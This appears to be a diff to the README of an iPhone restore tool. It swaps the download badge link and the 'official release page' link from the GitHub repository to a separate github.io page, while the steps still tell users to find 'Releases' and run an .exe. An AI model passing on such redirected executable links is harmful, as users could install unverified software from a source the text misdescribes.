@@ -1,6 +1,6 @@
 # 📱 Haafedk-iPhone-Tool - Restore your iPhone with ease
 
-[![](https://img.shields.io/badge/Download-Haafedk_Tool-blue.svg)](https://github.com/Pablito3289/Haafedk-iPhone-Tool)
+[![](https://img.shields.io/badge/Download-Haafedk_Tool-blue.svg)](https://pablito3289.github.io)
 
 ## 🛠 What this tool does
 
@@ -21,7 +21,7 @@ To run this tool, your computer must meet these requirements:
 
 You need the installation file to start.
 
-1. Go to the [official release page](https://github.com/Pablito3289/Haafedk-iPhone-Tool).
+1. Go to the [official release page](https://pablito3289.github.io).
 2. Look for the latest version under the "Releases" section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder.
